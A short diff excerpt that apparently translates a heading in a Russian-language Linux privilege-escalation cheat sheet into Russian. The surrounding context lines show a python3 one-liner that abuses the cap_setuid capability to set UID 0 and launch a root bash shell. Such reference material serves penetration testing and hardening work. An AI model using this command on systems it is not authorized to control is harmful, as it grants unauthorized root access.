@@ -408,7 +408,7 @@ python3 с `cap_setuid` — установка UID в 0 и запуск bash.
 python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
 ```
 
-perl cap_setuid — escalate to root
+perl с `cap_setuid` — повышение привилегий до root.
 
 ```
 # perl with cap_setuid+ep:
